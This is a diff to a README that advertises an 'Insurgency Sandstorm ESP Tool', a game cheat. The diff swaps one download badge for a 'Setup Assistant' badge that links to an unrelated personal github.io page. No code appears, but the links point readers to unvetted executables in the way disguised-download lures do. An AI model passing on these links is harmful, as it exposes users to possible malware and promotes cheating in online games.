@@ -4,12 +4,7 @@
 
 <h1 align="center">🎯 Insurgency Sandstorm ESP Tool</h1>
 
-<p align="center">
-  <a href="https://insurgency-sandstorm-esp-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Insurgency%20Sandstorm%20ESP%20Tool-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Insurgency Sandstorm ESP Tool" style="width:540px; height:37px;" />
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://christophertaylor6808762.github.io/.github/insurgency-sandstorm-tools)
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2023_08/image.png.8c0c1c7b1884f5e21b729648fb924111.png" alt="Insurgency Sandstorm ESP Tool Preview" width="800" />
